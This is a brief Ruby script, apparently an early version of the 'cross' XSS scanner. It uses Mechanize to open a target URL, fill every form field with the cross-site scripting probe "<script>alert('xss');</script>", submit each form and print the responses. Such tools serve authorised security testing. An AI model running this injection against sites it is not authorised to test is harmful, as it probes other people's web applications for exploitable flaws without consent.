require 'mechanize'
require 'ap'
require 'logger'

@uri = URI.parse(ARGV[0])
ap "cross (C) 2011 - thesp0nge: visiting " + @uri.host
agent = Mechanize.new {|a| a.log = Logger.new("cross.log")}
agent.user_agent_alias = 'Mac Safari'
page = agent.get(ARGV[0])
page.forms.each do |f|
  f.fields.each do |ff|
    ff.value = "<script>alert('xss');</script>"
  end
  pp = agent.submit(f)
  ap pp.body
end
